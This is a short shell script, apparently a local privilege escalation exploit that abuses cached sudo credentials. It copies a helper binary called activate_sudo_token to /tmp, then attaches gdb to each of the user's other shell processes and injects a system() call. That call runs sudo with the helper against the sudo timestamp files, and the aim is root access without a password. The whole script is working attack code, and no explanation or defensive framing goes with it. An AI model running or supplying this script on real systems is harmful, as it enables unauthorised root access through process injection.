#!/bin/sh
echo | sudo -S >/dev/null 2>&1
echo "Current process: $$"
cp activate_sudo_token /tmp/
chmod +x /tmp/activate_sudo_token
timestamp_dir=$(sudo --version | grep "timestamp dir" | grep -o '/.*')
for pid in $(pgrep -u "$(id -u)" -f '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' | grep -v "^$$\$"); do
    echo "Injecting process $pid -> $(cat "/proc/$pid/comm")"
    echo 'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")' \
        | gdb -q -n -p "$pid" >/dev/null 2>&1
done
